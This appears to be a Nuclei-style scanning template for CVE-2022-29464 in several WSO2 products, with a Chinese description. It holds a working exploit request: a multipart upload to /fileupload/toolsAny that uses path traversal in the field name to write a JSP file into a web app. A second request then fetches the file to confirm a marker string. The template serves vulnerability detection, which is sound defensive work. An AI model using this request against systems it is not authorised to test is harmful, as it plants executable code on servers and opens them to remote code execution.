id: CVE-2022-29464

info:
  name: WSO2 Management - 任意文件上传和RCE(CVE-2022-29464)
  author: wintry
  severity: critical
  description: |
    Certain WSO2产品允许不受限制的文件上传并执行远程代码.
    影响范围如下
    WSO2 API管理器 2.2.0及以上版本到4.0.0;
    WSO2身份服务器 5.2.0及以上版本到5.11.0;
    WSO2身份服务器 Analytics 5.4.0、5.4.1、5.5.0和5.6.0;
    WSO2身份服务器作为密钥管理器5.3.0及以上版本到5.10.0;
    以及WSO2 Enterprise Integrator 6.2.0及以上版本.
  metadata:
    max-request: 2
  tags: wso2

http:
  - raw:
      - |
        POST /fileupload/toolsAny HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=---------------------------250033711231076532771336998311
        Content-Length: 348

        -----------------------------250033711231076532771336998311
        Content-Disposition: form-data; name="../../../../repository/deployment/server/webapps/authenticationendpoint/{{to_lower("{{randstr}}")}}.jsp";filename="test.jsp"
        Content-Type: application/octet-stream

        <% out.print("WSO2-RCE-CVE-2022-29464"); %>
        -----------------------------250033711231076532771336998311--

      - |
        GET /authenticationendpoint/{{to_lower("{{randstr}}")}}.jsp HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "contains(body_2, 'WSO2-RCE-CVE-2022-29464')"

# Enhanced by mp on 2022/05/19